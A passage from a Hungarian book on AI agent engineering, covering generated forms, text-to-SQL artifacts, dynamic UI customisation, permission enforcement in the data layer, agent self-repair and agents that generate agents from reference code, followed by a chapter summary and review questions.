[^ch5-4]: A szerző kutatási projekt weboldala a https://01.me/research/ címen található, ahol minden projekthez tartozik egy folyamatosan frissített interaktív weboldal.

"Felhasználói Szándék Tisztázása."

Amikor a követelmények homályosak vagy hiányosak, az Ágensnek tisztázó kérdéseket kell feltennie a hiányzó információk összegyűjtéséhez. Az olyan termékek, mint az OpenAI Deep Research, jellemzően szöveges Kérdés-Feleleten keresztül teszik ezt, de ennek a megközelítésnek egyértelmű korlátai vannak: hatástalan, mert minden kérdés egy párbeszédkört fogyaszt, így tíz tisztázási ponthoz tíz körre lehet szükség; és rosszul fejezi ki a kérdések közötti függőségeket — például egy utazási cél korlátozza a rendelkezésre álló közlekedési módokat —, amit a puszta szöveg nehezen tud egyértelműen bemutatni.

Kódgeneráláson keresztül az Ágens strukturált interaktív felületeket hozhat létre a szöveges Kérdés-Felelet helyettesítésére. Az 5-8. ábra a dinamikus űrlap generálási folyamatot szemlélteti, bemutatva, hogyan alakítja az Ágens a tisztázó kérdéseket egy strukturált felületté, amely egyszerre kitölthető. Az Ágens egy HTML űrlapot generál, amely különféle beviteli vezérlőket tartalmaz — szövegdobozokat a szabad formátumú információkhoz, legördülő menüket az előre meghatározott opciókhoz, jelölőnégyzeteket a többszörös kiválasztáshoz és dátumválasztókat az egyszerűsített időbevitelhez. A fejlettebb verziók JavaScript segítségével lépcsőzetes űrlapokat hozhatnak létre, amelyek a felhasználó kiválasztására reagálva jelenítenek meg vagy rejtenek el további kérdéseket, és frissítik az elérhető opciókat. A felhasználó egyszerre tölti ki a teljes űrlapot, kiküszöbölve a több párbeszédkört, és egyértelműen láthatja az összes szükséges információt és a kérdések közötti logikai kapcsolatokat.

![5-8. ábra: Dinamikus űrlap generálási folyamata](images/fig5-8.svg)


> **Kísérlet 5-9 ★★: Szándék Tisztázó Rendszer Dinamikus Űrlapokkal**
>
> "Kísérlet Célja": Annak ellenőrzése, hogy az Ágens képes-e tisztázni a felhasználói szándékot dinamikusan generált HTML űrlapok segítségével.
>
> "Műszaki Megközelítés": Az Ágens elemzi a felhasználó kérését, azonosítja a tisztázási pontokat, és űrlapkódot generál lépcsőzetes logikával. A frontend rendereli, a felhasználó egyszer elküldi, az Ágens elemzi a JSON adatokat, és folytatja a feladatot.
>
> "Elfogadási Kritérium": A felhasználó bemenete: "Pekingbe szeretnék repülőjegyet foglalni." Az Ágens egy űrlapot generál a következő mezőkkel: indulási város (szöveges bevitel), indulási dátum (dátumválasztó), út típusa (rádiógombok egy- vagy oda-vissza útra) és visszaút dátuma (csak oda-vissza út kiválasztásakor jelenik meg). A felhasználó egyszerre küldi el az összes információt.
>

"SQL Lekérdezések Generálása."

Az adatbázis-lekérdezés egy olyan forgatókönyv, ahol a kódgenerálás jelentősen javíthatja az interakciós élményt. A hagyományos adatbázis-elérés GUI eszközökre vagy kézzel írt SQL-re támaszkodik; az előbbi nehézkesen kezelhető, az utóbbi speciális tudást igényel a felhasználótól. Egy Ágens lefordíthatja a természetes nyelvet SQL-re, de van egy kulcsfontosságú tervezési választás: az Ágens hajtsa-e végre a lekérdezést és írja le az eredményeket természetes nyelven, vagy generálja az SQL-t artefaktumként a rendszer számára a végrehajtáshoz és a frontend számára a megjelenítéshez?

Az első megközelítés "intelligensebbnek" tűnik, de rendkívül hatástalan — egy nagy táblán végzett lekérdezés több ezer sort adhat vissza. Ha az LLM mindezt elolvassa és prózában leírja, az égeti a tokeneket és az időt, és ami még rosszabb, az LLM-ek hírhedten hibásak az adatok "átírásában". Jobb megközelítés az "Artefaktum minta". Az 5-9. ábra egy SQL lekérdező Ágens munkafolyamatát mutatja be: ahelyett, hogy maga olvasná az adatokat, az Ágens egy SQL lekérdezést generál, és független "végrehajtható artefaktumként" adja át a rendszernek. A rendszer végrehajtja a lekérdezést az adatbázison, és az eredményeket táblázatban jeleníti meg a felhasználónak. Az adatok így közvetlenül az adatbázisból a felületbe kerülnek, anélkül, hogy áthaladnának az LLM-en; az LLM megírja a lekérdezést, de soha nem kell több ezer sort elolvasnia és újra közölnie. Ez a megközelítés gyorsabb és pontosabb.

A generált SQL-t és vizualizációs kódot nem szabad közvetlenül végrehajtani. A végrehajtási réteg csak olvasási jogosultságú adatbázis-hitelesítést használjon, elemezze az SQL-t, kizárólag jóváhagyott `SELECT` utasításokat engedjen át, és utasítsa el a DDL-, DML- és többutasításos lekérdezéseket. A felhasználó által megadott értékeket szerveroldali paraméterként kell kötni, korlátozva a lekérdezési időt, a visszaadott sorok számát, az elérhető táblákat és a dátumtartományt. A vizualizációs kód hálózattól és fájlrendszertől elszigetelt sandboxban fusson, és csak jóváhagyott eredményformátumot állítson elő. Az Artefaktum minta lerövidíti az adat útját, de nem helyettesíti az engedélyezési ellenőrzéseket vagy a végrehajtás elszigetelését.

![5-9. ábra: SQL-lekérdező ágens munkafolyamata](images/fig5-9.svg)


Továbbmenve, az Ágens két artefaktumot generálhat, amelyek egy csővezetéket alkotnak: egy SQL lekérdezést és egy vizualizációs kódot, például egy oszlopdiagram kódját. A frontend közvetlenül átadja az SQL eredményeket a vizualizációs kódnak. Az LLM generálja a kódot, de nem vesz részt az adat útvonalban — ez a kódgenerálás mint felület lényege.

> **Kísérlet 5-10 ★★: Természetes Nyelvű Interakciós ERP Ágens**
>
> Az ERP (Enterprise Resource Planning) szoftver kritikus rendszer a vállalkozások számára, jellemzően GUI felületet használ, ahol az összetett műveletek több egérkattintást igényelnek. Egy AI Ágens lefordíthatja a felhasználók természetes nyelvű kéréseit SQL lekérdezésekké, lehetővé téve az automatizált adatbázis-hozzáférést.
>
> Követelmények: Állíts be egy PostgreSQL adatbázist, amely két táblát tartalmaz: (1) Alkalmazott tábla, beleértve az alkalmazott azonosítóját, nevét, részlegét, szintjét, felvételi dátumát, felmondási dátumát (NULL azt jelenti, hogy jelenleg is alkalmazott); (2) Fizetés tábla, beleértve az alkalmazott azonosítóját, kifizetési dátumát, fizetését (havi egy rekord). Az Ágens automatikusan válaszol:
>
> 1. Mennyi az átlagos alkalmazotti szolgálati idő?
> 2. Hány aktív alkalmazott van az egyes részlegekben?
> 3. Melyik részlegben a legmagasabb az átlagos alkalmazotti szint?
> 4. Hány új alkalmazott csatlakozott az egyes részlegekhez idén és tavaly?
> 5. Mennyi volt az A részleg átlagos fizetése tavalyelőtt márciusától tavaly májusáig?
> 6. Melyik részlegben volt magasabb az átlagos fizetés tavaly, A vagy B?
> 7. Mennyi az átlagos fizetés az egyes szinteken idén?
> 8. Mennyi az átlagos fizetés az utolsó hónapban az egy évnél rövidebb, egy-két év és két-három év szolgálati idővel rendelkező alkalmazottaknál?
> 9. Melyik 10 alkalmazott fizetése nőtt a legtöbbet tavalyról idénre?
> 10. Vannak-e esetek kifizetetlen bérekre (alkalmazottak, akik egy adott hónapban alkalmazásban álltak, de nincs fizetési rekordjuk arra a hónapra)?
>

"Szoftver Dinamikus Generálása."

A kódgenerálás végső alkalmazása, hogy az Ágens teljesen dinamikusan, a semmiből hozzon létre szoftvert. Az Anthropic "Imagine with Claude" szolgáltatása jelöli ki a határvonalat: a felhasználó kérést tesz, Claude valós időben generálja a frontend felületet és az interakciós logikát, a felhasználó interakcióba lép a generált szoftverrel, Claude pedig módosítja a kódot, hogy új felületet hozzon létre az eredmények megjelenítéséhez. A felhasználó egy alkalmazást lát a semmiből létrejönni és folyamatosan fejlődni.

A teljesen dinamikus generálás azonban költséges és lassú — inkább a lehetőségek bemutatására alkalmas, mint termelési használatra. Egy pragmatikusabb megközelítés egy "meglévő keretrendszer testreszabása". Ez a "fél-egyedi" modell megőrzi az alapszoftver stabilitását, miközben kiválasztott szempontokat a felhasználói kontroll alá helyez. A felhasználó mondhatja, hogy "tedd kékre a gombot," "adj hozzá egy gyorsmenüt az oldalsávhoz," vagy "válts olvashatóbb betűtípusra"; az Ágens frissíti a frontend kódot, és a HMR (Hot Module Replacement — amely érintett modulokat frissít teljes oldal újratöltés nélkül, és általában megőrzi az alkalmazás állapotát) azonnal alkalmazza a változtatásokat. Egy mindenre egyforma termék minden felhasználóra szabott élménnyé válik.

> **Kísérlet 5-11 ★★: Beszélgetéses Felület Testreszabási Rendszer**
>
> "Kísérlet Célja": Lehetővé tenni a felhasználók számára a szoftverfelület azonnali testreszabását természetes nyelvű párbeszéden keresztül, és kiértékelni, hogy a kódgenerálás gyors újratöltéssel hatékonyan tud-e személyre szabott felhasználói élményeket nyújtani.
>
> "Műszaki Megközelítés": Építs egy alap chatbot alkalmazást (React frontend és FastAPI backend), és futtasd mindkét komponenst fejlesztői módban, gyors újratöltéssel (React HMR és FastAPI reload). A felhasználók UI testreszabási követelményeket (színek, betűtípusok, elrendezés, komponenspozíciók stb.) javasolnak a beszélgetés során. Az Ágens önállóan módosítja a kódot. A gyors újratöltési mechanizmus automatikusan érzékeli a fájlváltozásokat, a frontend újrafordít és frissül, a felhasználó valós időben látja a felület változásait. A rendszer több körös iteratív testreszabást támogat.

A dinamikus szoftver rugalmasságával együtt a hagyományos biztonsági feltevést is megváltoztatja. Korábban az alkalmazás üzleti kódját fejlesztették, felülvizsgálták, tesztelték és telepítették, majd viszonylag stabil maradt; ezért az engedélyezési ellenőrzések többnyire az alkalmazási rétegben helyezkedtek el. Ha egy Ágens bármikor generálhatja vagy átírhatja a felületeket, a munkafolyamatokat, sőt az adatelérési kódot is, ez a réteg többé nem stabil. Az új kód kihagyhat egy finom ellenőrzést, felfedhet egy korábban rejtett mezőt, vagy egy másik hívási útvonalon megkerülhet egy meglévő ellenőrzést. Akár egyszerű generálási hiba, akár promptinjekció után létrehozott veszélyes kód az ok, az eredmény ugyanaz: az üzleti kód által fenntartani kívánt jogosultsági határ észrevétlenül sérülhet.

Ezért a dinamikus szoftver biztonsági célja nem lehet az, hogy „az MI minden engedélyezési ellenőrzést helyesen írjon meg”. A cél az, hogy **a jogosultsági korlátok akkor is megkerülhetetlenek maradjanak, ha az MI hibás kódot ír**. Ha az engedélyezési ellenőrzések a dinamikusan generált üzleti logikában élnek, ugyanahhoz a bizalmi tartományhoz tartoznak, mint a korlátozni kívánt kód. A promptok, tesztek és kódellenőrzések csökkentik a hibák arányát, de nem fedhetik le kimerítően a jövőbeli generációk minden új végrehajtási útját, és nem jelenthetik a végső biztonsági határt.

Robusztusabb architektúra **a bizalmi határt az adatrétegbe helyezi át**. A dinamikusan generált alkalmazási kód kezelheti a megjelenítést, a munkafolyamatokat és az üzleti összehangolást, miközben egy stabil, ember által felülvizsgált mechanizmus érvényesíti, hogy ki mit tehet az egyes adatokkal. Az adatbázis sor szintű biztonsága a felhasználót a saját bérlőjének rekordjaira korlátozhatja; a megszorítások és validátorok elutasíthatják a törvénytelen állapotokat; a vezérelt nézetek, tárolt eljárások vagy adatelérési szolgáltatások pedig csak jóváhagyott műveleteket tehetnek láthatóvá. Minden olvasásnak és írásnak tartalmaznia kell egy megbízható futtatókörnyezet által kötött **hozzáférési kontextust**, amely tartalmazza a felhasználót, a bérlőt, a szerepkört vagy az Ágens identitását. A generált kód csak ezt a korlátozott identitást kapja meg: nem hamisíthatja meg, és nem szerezhet a szabályokat megkerülő privilegizált adatbázis-hitelesítést. Ha kihagyja is a saját ellenőrzését, az adatréteg elutasítja a jogosulatlan műveletet.

A jogosultság lefelé helyezése nem jelenti az összes üzleti logika adatbázisba költöztetését. Az alkalmazási réteg továbbra is végezhet előzetes ellenőrzéseket a gyors visszajelzésért, de a végső döntési jogkört az adatrétegnek kell megtartania. Ugyanaz a szabály javíthatja a felső réteg felhasználói élményét, és garanciát adhat az alsó rétegben. Ehhez minden adatelérési útvonalnak a megbízható adatrétegen kell áthaladnia; a generált kód nem kerülheti meg közvetlen adatbázis-kapcsolattal. Így a felső réteg folyamatosan változhat, miközben a nem alkuképes jogosultsági korlátok egy olyan rétegben maradnak, amelyet nem generálunk újra minden kérésnél.

> **Kísérlet 5-12 ★★★: Jogosultságot beágyazó adatobjektumok dinamikus szoftverhez**
>
> **Kísérlet célja**: Olyan objektumtároló építése, amely lehetővé teszi az alkalmazási kód dinamikus generálását vagy átírását, miközben az engedélyezést és az adatintegritást az adatréteg kényszeríti ki. Ellenőrizze, hogy a generált kód nem lépheti át a stabil határt állapotátmenet kihagyásával, határon kívüli érték írásával vagy bérlők közötti olvasással.
>
> **Műszaki megközelítés**: A `PermissionEmbeddedDataObjects` projekt implementációját használja PostgreSQL fölött működő Python objektumtároló middleware-rétegként. Az adattípusok deklarálják a jogosultsági szabályokat, a hozzáférési kontextust, a validátorokat, az objektumkapcsolatokat és a reakciókat. Minden olvasás és írás jogosultsági és validációs ellenőrzéseken, perzisztencián és referenciális integritáskezelésen, valamint szabályozott aszinkron reakciókon halad át. Először futtassa az LLM nélküli, determinisztikus felvételi folyamat demóját; opcionálisan kérjen a modellektől ellenséges műveleteket nyers SQL és a PEDO API ellen, majd hasonlítsa össze az adatbázis állapotait. A döntő összehasonlítás nem az, hogy a generált kezelőben szerepel-e a megfelelő `if`, hanem hogy ugyanaz a kérés megbízhatóan elfogadásra vagy elutasításra kerül-e a stabil adatrétegben.
>
> **Elfogadási kritériumok**: Egy érvényes felvételi folyamat-frissítés sikeres; az adatréteg elutasítja a jelölt állapotának átugrását, a pozíció tartományán kívüli fizetést és a bérlők közötti olvasást. A jogosultsági, validációs, bérlő-izolációs, referenciális integritási és reakcióteszteknek át kell menniük. Az implementáció a Chapter 5 kísérőprojektjében, a `permission-embedded-data-objects` könyvtárban található.

### Kód Kódot Hoz Létre: Ágens Bootstrapping

Az előző szakaszok a kódgenerálást követték egyik területről a másikra — a matematikai érveléstől a dokumentumkészítésen át a felület testreszabásig. Toljuk ezeket a képességeket a határukig, és természetesen felmerül a kérdés: használhat-e egy Ágens kódgenerálást egy másik Ágens létrehozására?

Először is tisztázni kell ennek a szakasznak a 8. fejezettel való munkamegosztását. Ez a szakasz arról szól, hogy egy Kódoló Ágens hogyan használ kódot a "saját fajtájának javítására és létrehozására" — önjavítás, önreplikáció és új Ágensek igény szerinti generálása. Fókusza a kódgenerálás és a rendszerépítési képesség, ezért ezt a folyamatot "bootstrapping"-nek nevezzük. A 8. fejezet nem magyarázza el újra, hogyan kell ezt a kódot megírni; ehelyett arra összpontosít, hogy a kiértékelt termelési tapasztalat hogyan váltja ki az önmódosítást: a tudás, az utasítások, a programok vagy a paraméterek kiválasztása a frissítés célpontjaként; egy kandidátus verzió generálása egy stabil verzióból; és a kockázat szabályozása regressziós teszteléssel, canary kiadásokkal és visszaállítással. A két fejezet a "kód módosítása" ponton találkozik, de más-más kérdésekre válaszol.


![5-10. ábra: Az ágens önindítási ciklusa](images/fig5-10.svg)


"Ágens Önjavítás: OpenClaw Doctor."

Az Ágens bootstrapping egyik kulcsfontosságú előfeltétele az önjavítás képessége. Az OpenClaw `doctor` parancsa ezt a képességet testesíti meg — automatikusan képes háromféle probléma érzékelésére:

- "Konfigurációs anomáliák": Lejárt OAuth tokenek, örökölt konfigurációs formátumok, port ütközések
- "Állapot problémák": Elavult kapcsolati zárfájlok, hiányzó plugin függőségek
- "Szolgáltatás állapot problémák": Gateway nem fut, hiányzó sandbox képek

Ezután automatikusan megoldja őket egy réteges javítási stratégiával: a biztonságos javítások (konfiguráció normalizálása, zárfájlok tisztítása) automatikusan végrehajtódnak; a kockázatos műveletek (szolgáltatás újraindítások, kényszerített konfiguráció felülírások) felhasználói megerősítést igényelnek.

Ne túlozzuk el: a gyakori problémák, mint a lejárt tokenek, elavult zárfájlok és port ütközések, egyértelmű érzékelési szabályokkal és rögzített javítási akciókkal rendelkeznek, és a `doctor` "először determinisztikus ellenőrzésekkel foglalkozik velük", akárcsak egy hagyományos üzemeltetési szkript. Az Ágens képesség a második rétegben válik jelentőssé: a szabályokon túli nehezebb problémák esetén a `doctor` LLM-et használ a hibanaplók elemzésére, a konfigurációs fájlok értelmezésére, a kiváltó okok kikövetkeztetésére és egy célzott javítási terv elkészítésére. A determinisztikus ellenőrzések megbízhatóan megoldják a gyakori problémákat, míg az LLM lefedi a hosszú farkat; a két réteg együtt lehetővé teszi, hogy a `doctor --fix` a gyakori gateway problémák jelentős részét automatikusan megoldja. Az teszi ezt "Ágens javítja Ágenst" mintává, hogy az Ágens nem egy külső rendszeren, hanem a saját futásidejű környezetén dolgozik, az önjavítást a rendszer adapter funkcióból a bootstrapping maginfrastruktúrájává emelve.

**Kulcsfontosságú Technikák, Amikor egy Ágens Ágenst Ír.**

Egy kiváló minőségű Ágens létrehozása sokkal nehezebb, mint hétköznapi alkalmazáskód generálása, mert az Ágens architektúra minták, legjobb gyakorlatok és gyakori buktatók mély megértését igényli. E területi szakértelem nélkül még a legerősebb kódgeneráló modellek is súlyos architekturális hibákkal rendelkező Ágenseket produkálnak. Gyakori hibák:

1. "Ad hoc kontextuskezelés": A 2. fejezetben tárgyalt szabványos kontextusformátum használatának elmulasztása, a trajektóriák egyszerű szövegként való bedobása a kontextusba, a strukturált üzenetekből származó KV Cache optimalizációk figyelmen kívül hagyása, és határfeltételi hibák bevezetése az eszközhívási ciklusokban
2. "Nem szabványos eszköztervezés": Homályos leírások, hiányzó használati határ utasítások és negatív listák, paraméterek konkrét példák nélkül
3. "Elavult technológiai választások": Hajlam a tréning adatokból származó leggyakoribb, de elavult modellek és API-k használatára. Megoldás: Tartson fenn egy SOTA tudásbázist, vagy szerelje fel az Ágenst keresési képességgel
4. "Elszakadás a külső ökoszisztémától": Elavult API-k, nem karbantartott könyvtárak vagy hibás minták használata

A leghatékonyabb út ezeknek a problémáknak a megoldására nem az összes szabály kimerítő felsorolása a promptban, hanem **kiváló minőségű Ágens implementációk biztosítása referenciaként**, amelyek a kódgeneráló Ágenst arra irányítják, hogy ezeket módosítsa, ahelyett, hogy a semmiből kezdené.

A példa alapú generálás előnye nyilvánvaló: a példakód magában hordozza a legjobb gyakorlatokat. Egy Ágens, amely egy validált implementációt adaptál, gyakrabban csinálja jól a dolgokat, mint az, amelyik a semmiből kezdi, mert az implementáció megőrzi a helyes architekturális döntéseket anélkül, hogy minden szabályt ki kellene írni a promptban.

Amikor egy Ágens feladatot kap egy új Ágens kifejlesztésére, először másolja le a saját kódját (vagy más validált, kiváló minőségű implementációkat), majd végezzen célzott módosításokat: igazítsa a rendszer promptot az új szerephez, cserélje ki vagy adjon hozzá eszközöket az új funkciókhoz, módosítsa az üzleti logikát az architekturális keret megőrzése mellett. Ez az "önreplikáció adaptív módosítással" minta biztosítja, hogy az új Ágens örökölje a mag technikai előnyöket, miközben lehetővé teszi a differenciálódást specifikus dimenziókban — akárcsak a génreplikáció mutációval a biológiában.

> **Kísérlet 5-13 ★★★: Fejlessz Egy Ágenst, Amely Képes Ágenseket Létrehozni**
>
> "Kísérlet Célja": Építs egy Kódoló Ágenst metaprogramozási képességekkel — olyan képességgel, hogy olyan programokat írjon, amelyek más programokat generálnak vagy módosítanak —, hogy automatikusan létre tudjon hozni új Ágens rendszereket a felhasználói követelményekből, miközben betartja a legjobb gyakorlatokat.
>
> "Műszaki Megközelítés": Biztosíts a Kódoló Ágens számára kiváló minőségű Ágens implementációkat referenciaként (a ch5/coding-agent projekt maga is használható). Amikor az a feladata, hogy új Ágenst hozzon létre, az Ágens először másolja le ezt a példakódot, majd végezzen célzott módosításokat a felhasználó specifikus igényei alapján.
>
> "Elfogadási Kritérium": A generált Ágens sikeresen fut és alapvető feladatokat hajt végre. Ellenőrizze, hogy szabványos üzenetformátumokat és eszközhívási protokollokat, jelenleg ajánlott modelleket és API-kat, valamint helyes kontextus- és állapotkezelést használ-e több beszélgetési körön keresztül. Hasonlítsa össze a semmiből generálást a példa alapú módosítással, és erősítse meg, hogy az utóbbi javítja a minőséget és a hatékonyságot.
>
>
> ![5-11. ábra: Ágenseket létrehozó ágens folyamata](images/fig5-11.svg)
>
>

Az Ágens bootstrapping a kódgenerálás végső alkalmazása — egy Ágens, amely képes Ágenseket létrehozni, eléri az intelligencia önreplikációját. Ezzel nyomon követtük a fejezet teljes ívét: a Kódoló Ágens alapjaitól a kódgenerálás számos felhasználásán át a bootstrapping-ig.

## Fejezet Összefoglaló

Ez a fejezet egy dolgot állított végig: a kód nem csupán egy eszköz programok írására — ez az Ágens formalizált gondolkodásának és precíz kifejezésének nyelve.

A Harness mérnökség szakasz egy központi következtetésre jutott: a Kódoló Ágensek azért érettek, nem azért, mert a kódgeneráló modellek kivételesen erősek, hanem mert a szoftvermérnökség évtizedek alatt felhalmozott infrastruktúrája — tesztcsomagok, típusrendszerek, verziókezelés — természetes módon alkot egy erős Harness-t. Ennek a következtetésnek át kell utaznia más Ágens forgatókönyvekhez. A hibák és hibahelyreállítás szakasz ugyanazon téma másik oldalát kínálja: egy Ágens megbízhatóságát nem az határozza meg, hogy a modell követ-e el hibákat, hanem hogy minden hibafajtához tartozik-e megfelelő érzékelési, helyreállítási és megszakítási útvonal.

A második rész a kódgenerálás széleskörű értékét mutatta be a programozáson túl, ami a fő szöveg hat dimenziójának felel meg:

- "Gondolkodási Eszköz": Szimbolikus számítás és kényszermegoldás kihasználása a valószínűségi gondolkodás hiányosságainak kompenzálására
- "Üzleti Szabályok Korlátozása": Üzleti szabályok egyértelmű kifejezése és determinisztikus biztonsági háló biztosítása visszafordíthatatlan műveletekhez, ahol a garancia értéke messze meghaladja a megvalósítás költségét
- "Multimédia Generálás": Multimédiás tartalmak, például PPT-k és videók létrehozása egy Proposer-Reviewer mechanizmuson keresztül
- "Rendszer Adapter": Formátumfejlődés automatikus követése a naplóelemzés és probléma-diagnosztika teljes automatizálásának eléréséhez
- "Generatív UI": Űrlapok, vizualizációk és akár teljes testreszabható alkalmazások dinamikus létrehozása, a puszta szöveg korlátainak megtörése
- "Ágens Bootstrapping": Kód használata meglévő Ágensek javítására és újak létrehozására, végső soron lehetővé téve, hogy egy Ágens más Ágenseket hozzon létre

A kód értéke az Ágens számára erre redukálódik: egyszerre eszköz a feladatok elvégzésére és mechanizmus a tudás felhalmozására, eszközök létrehozására és önfejlesztésre — egy igazi "meta-képesség."

Most befejeztük a könyv "Ágensek Építése" részét — és a kódgenerálás a legáltalánosabb meta-képessége. De egy kulcskérdés maradt megválaszolatlanul: hogyan lehet ezeknek a tervezési döntéseknek a hatásait tudományosan mérni? A következő fejezettől kezdve a könyv az "Értékelés és Fejlődés" felé fordul. A 6. fejezet egy módszertant fejleszt ki, amely az értékelési környezeteket, adathalmazokat, automatikus ítélkezést és modellválasztást fedi le; a 7. és 8. fejezet ezután a folyamatos fejlesztést tárgyalja paraméterszinten, illetve a teljes Ágens rendszer szintjén.

## Gondolatkérdések

1. ★★ A kódgenerálást az Ágens "meta-képességének" nevezik. De a kódvégrehajtás biztonsági kockázatokat vezet be — az Ágens által generált kód tartalmazhat sérülékenységeket, végtelen ciklusba eshet, vagy erőforrásokat meríthet ki. A sandboxolás csökkentheti ezeket a kockázatokat, de korlátozza is, hogy mit tehet a kód, például megtagadva a hozzáférést a hálózathoz vagy a fájlrendszerhez. Hogyan található meg az optimális egyensúly a biztonság és a képesség között?
2. ★★★ Az Ágens bootstrapping — egy Ágens, amely képes Ágenseket létrehozni — lehetővé teszi az "intelligencia önreprodukcióját." De minden bootstrapping iteráció új torzításokat vagy hibákat vezethet be. Felhalmozódnak-e ezek a hibák a generációk során? Hogyan akadályozható meg a degradáció az Ágens bootstrapping-ben?
3. ★★ Amikor egy kódgeneráló Ágens naplóelemzést végez, automatikusan követheti a formátumfejlődést. De ha egy formátumváltozás hiba, nem pedig szándékos módosítás, az Ágens alkalmazkodóképessége éppen ellenkezőleg, elfedheti a problémát. Hogyan különböztesse meg az Ágens az "alkalmazkodást igénylő változást" a "jelentést igénylő anomáliától"?
4. ★★ Ez a fejezet többször használja a Proposer-Reviewer mechanizmust PPT generálásban, videó szerkesztésben és napló vizualizációban. Ha a Reviewer esztétikai preferenciái eltérnek a célfelhasználóétól — például a Reviewer ésszerűnek tartja az információ sűrűséget, de a felhasználó túl zsúfoltnak találja — a visszacsatolási hurok egy rossz lokális optimumba konvergálhat. Hogyan építhető be a felhasználói preferencia visszajelzés a Reviewer hurokba?
5. ★★ Ez a fejezet több módot is bemutat arra, hogy egy Kódoló Ágens hogyan szilárdíthatja meg a végrehajtás és hibakeresés során szerzett tapasztalatokat a kódbázisban — tudásbázis fájlok írása, architektúra dokumentáció frissítése, projekt utasítás fájlok karbantartása és műveleti szekvenciák kódba kódolása. Ha ez a tapasztalat tovább desztillálódik a rendszer promptban lévő szabályokká, a szabálykészlet idővel folyamatosan bővülni fog. Hogyan végezhető "szemétgyűjtés" a felhalmozott szabályokon a redundáns vagy elavult bejegyzések azonosítására és eltávolítására? Miért nem minősül egyetlen sikeres kódmódosítás még folyamatos fejlődésnek a 8. fejezet értelmében?
6. ★ "Azok a csapatok, amelyek barátságosak a távoli munkához, általában barátságosak az AI Ágensekhez is." Mennyire áll közel a csapata vagy szervezete az "AI-kész" állapothoz a tudásdokumentáció szempontjából? Mi a legnagyobb akadály?
7. ★★★ Simon Willison javasolta a "Halálos Triászt" az Ágensek számára — hozzáférés a privát adatokhoz, kitettség megbízhatatlan tartalomnak és külső kommunikációs képesség. Ez a fejezet egy negyedik elemet ad hozzá: a perzisztens memóriát. Hogyan tervezne biztonsági stratégiát egy olyan termelési környezethez, amelynek mind a négyet egyszerre kell kezelnie?
8. ★★ Az Artefaktum minta lehetővé teszi, hogy az Ágens által generált SQL vagy frontend kód közvetlenül a felhasználó böngészőjében vagy adatbázisában kerüljön végrehajtásra. De a generált SQL végezhet destruktív műveleteket, és a generált HTML tartalmazhat sérülékenységeket. Hogyan biztosítható a rendszer biztonsága?
9. ★★ Az üzleti szabályok kódolása az adatbázis alapigazsággal szembeni validációkként, miközben a paraméter tervezés irányítja a modellt, hogy a hívás előtt ellenőrizze a szabályzatfeltételeket, lényegében kódstruktúrát használ az Ágens viselkedésének korlátozására. Milyen előnyei és korlátai vannak ennek a "kód mint szabályok" mintának a természetes nyelven kifejezett szabályokkal szemben?
10. ★★ Az Artefaktum minta lehetővé teszi, hogy egy Ágens SQL-t vagy vizualizációs kódot generáljon a frontend általi közvetlen végrehajtásra, megkerülve az LLM nagy mennyiségű adat feldolgozásának szükségességét. Milyen előnyei és hátrányai vannak ennek a munkamegosztásnak — "az Ágens generálja a kódot, a rendszer hajtja végre a kódot" — a hagyományos mintával szemben, ahol az Ágens közvetlenül adja a választ?
